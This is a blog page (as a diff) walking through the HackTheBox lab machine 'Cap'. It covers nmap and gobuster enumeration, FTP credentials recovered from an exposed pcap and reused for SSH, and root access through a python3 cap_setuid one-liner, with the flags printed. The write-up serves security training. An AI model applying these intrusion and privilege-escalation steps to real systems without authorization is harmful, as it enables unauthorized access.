@@ -1,0 +1,392 @@
+<!doctype html><html lang=en-us><head>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-194024736-1','auto'),ga('send','pageview'))</script>
+<meta charset=utf-8>
+<title>Cap HackTheBox Walkthrough</title>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name=author content="Nasef">
+<meta name=generator content="Hugo 0.88.1">
+<link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css>
+<link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css>
+<link href=https://iamnasef.com/scss/style.min.css rel=stylesheet>
+<link rel="shortcut icon" href=https://iamnasef.com/images/favicon.png type=image/x-icon>
+<link rel=icon href=https://iamnasef.com/images/favicon.ico type=image/x-icon>
+</head><body><nav class="navbar navbar-expand-lg site-navigation">
+<div class=container>
+<a class=navbar-brand href=https://iamnasef.com/>
+<img src=https://iamnasef.com/images/logo.png alt=logo>
+</a>
+<button class="navbar-toggler collapsed" type=button data-toggle=collapse data-target=#sitenavbar>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<div class="collapse navbar-collapse" id=sitenavbar>
+<ul class="navbar-nav ml-auto main-nav">
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/>Home</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/projects>Projects</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/courses>Courses</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/blog>Blog</a>
+</li>
+<li class=nav-item>
+<a class="nav-link btn btn-sm btn-primary btn-sm-rounded" href=https://iamnasef.com/contact>
+<span class=btn-area>
+<span data-text="Contact Me">
+Contact Me
+</span>
+</span>
+</a>
+</li>
+</ul>
+</div>
+</div>
+</nav>
+<main>
+<section class="site-blog details">
+<div class=container>
+<div class="row justify-content-center">
+<div class=col-lg-8>
+<article class=site-blog-details>
+<h2 class=blog-title>Cap HackTheBox Walkthrough</h2>
+<p><span>October 4, 2021</span> by <span>Nasef</span></p>
+<img class=feature-image src=https://iamnasef.com/images/blog/017/featured-image.png alt=blog-feature-image>
+<p>Hello everybody!
+I am Nasef and today I am going to show you how I hacked Cap machine from hack the box, so let&rsquo;s get started!</p>
+<h2 id=services-enumeration>Services Enumeration</h2>
+<p>Nmap found ports ftp (21), ssh(22) and http (80) open.</p>
+<pre tabindex=0><code>└─# nmap -sC -sV 10.10.10.245
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-24 12:40 EDT
+Stats: 0:01:52 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 66.67% done; ETC: 12:43 (0:00:54 remaining)
+Stats: 0:01:57 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 66.67% done; ETC: 12:43 (0:00:57 remaining)
+Nmap scan report for cap.htb (10.10.10.245)
+Host is up (0.21s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
+|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
+|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+80/tcp open  http    gunicorn
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 404 NOT FOUND
+|     Server: gunicorn
+|     Date: Thu, 24 Jun 2021 16:44:36 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 232
+|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+|     &lt;title&gt;404 Not Found&lt;/title&gt;
+|     &lt;h1&gt;Not Found&lt;/h1&gt;
+|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Thu, 24 Jun 2021 16:44:30 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 19386
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html class=&quot;no-js&quot; lang=&quot;en&quot;&gt;
+|     &lt;head&gt;
+|     &lt;meta charset=&quot;utf-8&quot;&gt;
+|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;
+|     &lt;title&gt;Security Dashboard&lt;/title&gt;
+|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+|     &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/png&quot; href=&quot;/static/images/icon/favicon.ico&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/font-awesome.min.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/themify-icons.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/metisMenu.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/owl.carousel.min.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/slicknav.min.css&quot;&gt;
+|     &lt;!-- amchar
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Thu, 24 Jun 2021 16:44:31 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Allow: OPTIONS, GET, HEAD
+|     Content-Length: 0
+|   RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|     Content-Type: text/html
+|     Content-Length: 196
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;title&gt;Bad Request&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;
+|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+|_http-server-header: gunicorn
+|_http-title: Security Dashboard
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.91%I=7%D=6/24%Time=60D4B58C%P=x86_64-pc-linux-gnu%r(GetR
+SF:equest,1AE1,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
+SF:Thu,\x2024\x20Jun\x202021\x2016:44:30\x20GMT\r\nConnection:\x20close\r\
+SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193
+SF:86\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;en\&quot;&gt;\
+SF:n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x2
+SF:0&lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\x20\
+SF:x20\x20\x20&lt;title&gt;Security\x20Dashboard&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\
+SF:x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=
+SF:1\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;shortcut\x20icon\&quot;\x20type=\&quot;image
+SF:/png\&quot;\x20href=\&quot;/static/images/icon/favicon\.ico\&quot;&gt;\n\x20\x20\x20\x20&lt;
+SF:link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/bootstrap\.min\.css\&quot;&gt;
+SF:\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/fon
+SF:t-awesome\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20
+SF:href=\&quot;/static/css/themify-icons\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=
+SF:\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/metisMenu\.css\&quot;&gt;\n\x20\x20\x20\x2
+SF:0&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/owl\.carousel\.min\.
+SF:css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/c
+SF:ss/slicknav\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;!--\x20amchar&quot;)%r(HTTPOption
+SF:s,B3,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Thu,\x2
+SF:024\x20Jun\x202021\x2016:44:31\x20GMT\r\nConnection:\x20close\r\nConten
+SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20GET,\x2
+SF:0HEAD\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTSPRequest,121,&quot;HTTP/1\.1\x2
+SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text
+SF:/html\r\nContent-Length:\x20196\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\x20
+SF:\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\
+SF:n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\x20Invali
+SF:d\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;RTSP
+SF:/1\.0&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(FourOhFourRequest,189
+SF:,&quot;HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20T
+SF:hu,\x2024\x20Jun\x202021\x2016:44:36\x20GMT\r\nConnection:\x20close\r\n
+SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\
+SF:r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20HTML\x203\.2\x20
+SF:Final//EN\&quot;&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;
+SF:\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
+SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
+SF:eck\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n&quot;);
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 142.18 seconds
+
+
+</code></pre><p>I ran another nmap scan -sU for enumerating udp services and found two filtered ports, I may look into them.</p>
+<pre tabindex=0><code></code></pre><p>I ran another nmap scan -p- for enumerating the non-default ports but it gave me nothing new.</p>
+<pre tabindex=0><code></code></pre><p>This concludes the service enumeration phase.</p>
+<h2 id=exploiting-ftp-service>Exploiting FTP Service</h2>
+<p>I tried to exploit FTP Service, and first thing came to my mind is trying to find if anonymous ftp login is allowed, but it wasn&rsquo;t.</p>
+<pre tabindex=0><code>ftp cap.htb     
+Connected to cap.htb.
+220 (vsFTPd 3.0.3)
+Name (cap.htb:kali): anonymous
+331 Please specify the password.
+Password:
+530 Login incorrect.
+Login failed.
+ftp&gt; exit
+221 Goodbye.
+
+</code></pre><h2 id=exploiting-http-service>Exploiting HTTP Service</h2>
+<p>Using the current information, I decided to further enumerate the http service, but first I added the hostname of the machine in /etc/hosts because some machines use host routing.</p>
+<p>Then I ran gobuster to enumerate hidden directories, which gave me nothing.</p>
+<pre tabindex=0><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://cap.htb/ -x php,txt,git
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://cap.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt,git
+[+] Timeout:                 10s
+===============================================================
+2021/06/24 12:41:07 Starting gobuster in directory enumeration mode
+===============================================================
+/data                 (Status: 302) [Size: 208] [--&gt; http://cap.htb/]
+/ip                   (Status: 200) [Size: 17446]                    
+/netstat              (Status: 200) [Size: 31162]                    
+/capture              (Status: 302) [Size: 220] [--&gt; http://cap.htb/data/2]                                                                   
+===============================================================
+2021/06/24 12:54:36 Finished
+===============================================================
+
+
+</code></pre><p>I opened cap.htb and found that this is a static website, but what took my attention is that there is pcap file hosted there!</p>
+<p><img src=/images/blog/017/1.png alt=Username></p>
+<p>I ran burp intruder to see if there are any other files but there was nothing except 0,1.</p>
+<p><img src=/images/blog/017/2.png alt=Username></p>
+<p>I downloaded them all and opened the first one 0.pcap with wireshark. the first thing I looked for was ftp requests, as they may include plain text credential and It did!</p>
+<p><img src=/images/blog/017/3.png alt=Username></p>
+<p>I used the credintials and was successuflly able to ftp login. I downloaded the user.txt flag</p>
+<pre tabindex=0><code>$ ftp cap.htb
+Connected to cap.htb.
+220 (vsFTPd 3.0.3)
+Name (cap.htb:kali): nathan
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-r--------    1 1001     1001           33 Jun 24 16:44 user.txt
+226 Directory send OK.
+ftp&gt; get user.txt
+local: user.txt remote: user.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for user.txt (33 bytes).
+226 Transfer complete.
+33 bytes received in 0.00 secs (81.7933 kB/s)
+ftp&gt; exit
+221 Goodbye.
+$ cat user.txt        
+765ae447b29a59a1c37bb7ff28abd4d7
+
+</code></pre><p>The first thing I normally do when I get any default credentials, I try using them in all available services. I did with SSH and was able to login thanks to password reuse!</p>
+<pre tabindex=0><code>ssh nathan@cap.htb                
+nathan@cap.htb's password: 
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Jun 24 17:06:19 UTC 2021
+
+  System load:           0.02
+  Usage of /:            35.0% of 8.73GB
+  Memory usage:          34%
+  Swap usage:            0%
+  Processes:             232
+  Users logged in:       1
+  IPv4 address for eth0: 10.10.10.245
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:eb9e
+
+  =&gt; There are 3 zombie processes.
+
+
+
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Thu Jun 24 16:51:01 2021 from 10.10.14.23
+nathan@cap:~$ 
+</code></pre><p>and voila we got into the machine.</p>
+<h2 id=privilege-escalation>Privilege Escalation</h2>
+<p>Before running any heavy privesc scripts, I prefer going through my manual checklist. I tried searching for capabilities and found that python has the capability to change the UID of process</p>
+<pre tabindex=0><code>nathan@cap:/$ getcap -r / 2&gt; /dev/null
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+
+</code></pre><p>Using python, I used os to set the uid of the following process to 0 which equals to root, then made the process running /bin/bash which got us root privileges.</p>
+<pre tabindex=0><code>nathan@cap:/$ python3 -c 'import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)'
+root@cap:/# whoami
+root
+root@cap:/# cd root/
+root@cap:/root# cat root.txt 
+2e45dbf5eb04e469a1fd2a1a486b1516
+
+</code></pre><p>Thank you for reading!</p>
+</article>
+</div>
+</div>
+</div>
+</section>
+<section class=site-cta id=contact style=background-image:url(https://iamnasef.com/images/backgrounds/cta-background.jpg)>
+<div class=container>
+<div class=row>
+<div class="col-12 text-center">
+<h1 class=site-cta-title>SAY HELLO</h1>
+<a class=mail-link href=mailto:hello@iamnasef.com><h2 class=mail>HELLO@IAMNASEF.COM</h2></a>
+<div class=sm-links>
+<a href=https://twitter.com/iamnasef><i class="fa fa-twitter-square" aria-hidden=true></i></a>
+<a href=https://www.linkedin.com/in/iamnasef/><i class="fa fa-linkedin-square" aria-hidden=true></i></a>
+<a href=https://github.com/iamnasef><i class="fa fa-github-square" aria-hidden=true></i></a>
+<a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ><i class="fa fa-youtube-square" aria-hidden=true></i></a>
+</div>
+</div>
+</div>
+</div>
+</section>
+</main><footer class=site-footer>
+<div class=container>
+<div class=row>
+<div class=col-12>
+<div class=site-footer-logo><a href=https://iamnasef.com/><img src=https://iamnasef.com/images/logo-footer.png alt=logo-footer width=100px height=100px></a></div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Contact Info</h5>
+<p class=site-footer-widget-description>
+<a href=mailto:hello@iamnansef.com>hello@iamnansef.com</a>
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Check it</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://iamnasef.com/blog>Blog</a></li>
+<li><a href=https://iamnasef.com/projects>Projects</a></li>
+<li><a href=https://iamnasef.com/courses>Courses</a></li>
+<li><a href=https://iamnasef.com/contact>Contact</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Social Media</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://www.linkedin.com/in/iamnasef/>Linkedin</a></li>
+<li><a href=https://twitter.com/iamnasef>Twitter</a></li>
+<li><a href=https://github.com/iamnasef>Github</a></li>
+<li><a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ>YouTube</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Keeping you safe</h5>
+<p class=site-footer-widget-description>
+Application Security Engineering<br>Cyber Security Technical Training<br>Cyber Security Awarness
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-12">
+<a href=#top class=site-footer-widget-top>
+<img src=https://iamnasef.com/images/to-top.svg alt=back-to-top>
+<p>
+I want to
+<br>
+visit again
+</p>
+</a>
+</div>
+</div>
+</div>
+</footer>
+<script src=https://iamnasef.com/js/formhandler.min.js></script>
+<script src=https://iamnasef.com/js/vendor.min.js></script>
+<script src=https://iamnasef.com/js/script.min.js></script></body>
+</html>
